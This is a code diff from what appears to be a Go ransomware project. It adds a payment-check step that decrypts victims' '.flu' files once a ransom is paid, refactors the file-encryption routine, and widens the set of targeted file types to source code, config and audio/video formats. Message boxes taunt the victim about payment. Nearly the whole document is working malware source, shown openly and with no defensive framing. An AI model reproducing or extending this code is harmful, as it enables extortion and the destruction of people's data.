@@ -8,9 +8,9 @@ import (
     "sync"
     "runtime"
     "path/filepath"
+    "encoding/binary"
 
     "github.com/kernullist/gowinsvc"
-    "github.com/sug0/sr-ransomware/go/exe"
     "github.com/sug0/sr-ransomware/go/win"
     "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
 )
@@ -79,10 +79,31 @@ func cryptoMain() {
 
     switch code {
     case IDYES:
+        aesIVKey, err := victim.VerifyPayment()
+        if err != nil {
+            win.MessageBox(
+                "Damn",
+                "Looks like you haven't paid yet, or we are having some issues. We'll be in touch in 5 minutes...",
+                win.MB_OK | win.MB_ICONERROR,
+            )
+            return
+        }
+        win.MessageBox(
+            "YAYYYYY",
+            "We'll be decrypting your files now!!!!!!!!",
+            win.MB_OK | win.MB_ICONEXCLAMATION,
+        )
+        decryptFiles(aesIVKey)
+        victim.Desinfect()
+        win.MessageBox(
+            "WOOHOOOOOOO",
+            "ALL DONE, HAVE A GOOD ONE MATE",
+            win.MB_OK | win.MB_ICONEXCLAMATION,
+        )
     case IDNO:
         win.MessageBox(
             "No worries mate!",
-            "In 5 minutes, this dialog will pop up again. :D",
+            "In 5 minutes, this dialog will pop up again. ;)",
             win.MB_OK | win.MB_ICONEXCLAMATION,
         )
     }
@@ -129,7 +150,7 @@ func (s *service) beforeDeployment(exit <-chan bool) {
 
 func (s *service) afterDeployment(exit <-chan bool) {
     done := make(chan struct{})
-    go s.encryptFiles(done)
+    go encryptFiles(done)
     for {
         select {
         case <-exit:
@@ -156,7 +177,7 @@ func (s *service) launchCrypto() {
     win.LaunchProcess(s.exec)
 }
 
-func (s *service) encryptFiles(done chan<- struct{}) {
+func encryptFiles(done chan<- struct{}) {
     defer close(done)
     pk, err := victim.ImportPublicKey()
     if err != nil {
@@ -176,6 +197,30 @@ func (s *service) encryptFiles(done chan<- struct{}) {
                 return
             }
             victim.EncryptFile(pk, path)
+        }()
+    })
+    wg.Wait()
+}
+
+func decryptFiles(aesIVKey []byte) {
+    sk, err := victim.ImportSecretKey(aesIVKey)
+    if err != nil {
+        return
+    }
+    wg := sync.WaitGroup{}
+    sem := make(chan struct{}, runtime.NumCPU())
+    filepath.Walk(os.GetEnv("HOMEPATH"), func(path string, ent os.FileInfo, err error) error {
+        wg.Add(1)
+        go func() {
+            sem <- struct{}{}
+            defer func() {
+                <-sem
+                wg.Done()
+            }()
+            if ent.IsDir() || filepath.Ext(path) != ".flu" {
+                return
+            }
+            victim.DecryptFile(sk, path)
         }()
     })
     wg.Wait()
@@ -260,12 +305,19 @@ func (s *service) initExtensions() {
             ".php": true,
             ".asp": true,
             ".rb": true,
+            ".css": true,
+            ".html": true,
+            ".toml": true,
+            ".json": true,
+            ".go": true,
+            ".rs": true,
             ".java": true,
             ".jar": true,
             ".class": true,
             ".sh": true,
             ".mp3": true,
             ".wav": true,
+            ".flac": true,
             ".swf": true,
             ".fla": true,
             ".wmv": true,
@@ -274,8 +326,11 @@ func (s *service) initExtensions() {
             ".mpeg": true,
             ".asf": true,
             ".avi": true,
+            ".ogg": true,
+            ".opus": true,
             ".mov": true,
             ".mp4": true,
+            ".webm": true,
             ".3gp": true,
             ".mkv": true,
             ".3g2": true,
